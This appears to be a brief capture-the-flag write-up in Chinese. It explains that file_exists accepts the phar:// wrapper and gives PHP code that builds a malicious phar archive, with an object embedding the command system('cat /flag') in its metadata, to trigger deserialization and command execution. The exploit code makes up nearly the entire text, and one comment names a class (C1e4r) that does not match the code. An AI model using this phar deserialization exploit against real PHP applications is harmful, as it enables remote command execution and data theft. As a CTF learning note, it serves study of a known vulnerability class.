源码中elseif中的file_exists支持phar协议；所以传入filepath=phar://+文件路径即可

生成phar文件 

<?php
    class TestObject {
        public $cmd="system('cat /flag');";
}
$a=new TestObject();


$phar = new Phar("exp2.phar"); //.phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >'); //固定的
$phar->setMetadata($a); //触发的头是C1e4r类，所以传入C1e4r对象
$phar->addFromString("exp.txt", "test"); //随便写点什么生成个签名
$phar->stopBuffering();

?>
